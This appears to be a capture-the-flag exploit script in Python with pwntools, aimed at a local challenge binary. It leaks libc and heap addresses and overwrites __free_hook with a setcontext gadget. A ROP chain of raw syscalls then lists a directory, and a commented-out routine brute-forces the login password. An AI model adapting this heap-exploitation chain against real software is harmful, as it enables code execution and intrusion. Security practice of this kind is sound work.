from pwn import *
context(
    terminal = ['tmux','splitw','-h'],
    os = "linux",
    arch = "amd64",
    log_level="debug",
)
def debug(io, libc):
    gdb.attach(io,
f'''
# b *$rebase(0x1753)
# b *$rebase(0x1487)
b *{libc}
# b *free
'''
)

# def guess(prev: bytes) -> bytes:
#     io = process(b'./pwn')
#     fail = 1
#     code = 0x30
#     while fail:
#         io.sendlineafter(b"Input your username", b'4dm1n')
#         io.sendlineafter(b"Input your password", prev + p8(code))
#         if io.recvuntil(b"Invalid password length", timeout=0.25):
#             fail = 0
#             break
#         code += 1
#     io.close()
#     return prev + p8(code)

# password = b''
# while(True):
#     password = guess(password)
#     print(password)

io = process(b'./pwn')
username = b'4dm1n'
password = b'985da4f8cb37zkj'
io.sendlineafter(b"Input your username", username)
io.sendlineafter(b"Input your password", password)

def Add(idx, size, content):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'key: ', str(idx))
    io.sendlineafter(b'size: ', str(size))
    io.sendlineafter(b'value: ', content)
def Read(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'key: ', str(idx))
def Delete(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'key: ', str(idx))
def Edit(idx, content):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'key: ', str(idx))
    io.sendlineafter(b'value: ', content)

i = 0
while(i != 11):
    Add(i, 0x300, b'a')
    i += 1
Delete(0x0)
Delete(0x1)
Delete(0x2)
Delete(0x3)
Delete(0x4)
Delete(0x5)
Delete(0x6)
Delete(0x7)
Delete(0x9)
Read(0x7)

key1 = 0x2e50a4b3e366e833
key2 = 0x9095f7bfa7691d0
io.recvuntil(b'[key,value] = [7,')
recv1 = u64(io.recv(0x8))
recv2 = u64(io.recv(0x8))
print(hex(recv1))
print(hex(recv2))
libc_base = (recv1^key1) - 0x3ebca0
heap_base = (recv2^key2) - 0x31f0
print(hex(libc_base))
print(hex(heap_base))

key1 = 0x2e50a4b3e366e833
__free_hook = libc_base + 0x3ed8e8
set_context = libc_base + 0x52085
Edit(6, p64(__free_hook^key1))

rax = libc_base + 0x000000000001b500
rdi = libc_base + 0x000000000002164f
rsi = libc_base + 0x0000000000023a6a
rdx = libc_base + 0x0000000000001b96
syscall = libc_base + 0x11002F

# read
rop = p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(heap_base) + p64(rdx) + p64(0x10) + p64(syscall)
# open
rop+= p64(rax) + p64(0x2) + p64(rdi) + p64(heap_base) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(syscall)
# getdents64
rop+= p64(rax) + p64(0xD9) + p64(rdi) + p64(3) + p64(rsi) + p64(heap_base) + p64(rdx) + p64(0x100) + p64(syscall)
# write
rop+= p64(rax) + p64(0x1) + p64(rdi) + p64(1) + p64(rsi) + p64(heap_base) + p64(rdx) + p64(0x702) + p64(syscall)

payload =  b'\x00'*0xa0
payload += p64(heap_base + 0x28d0+0xa0)
payload += rop

Add(0, 0x300, payload)
key1 = 0x2e50a4b3e366e833
Add(1, 0x300, p64(set_context^key1))
debug(io, set_context)
Delete(0)

io.send(b'./\x00')
io.interactive()
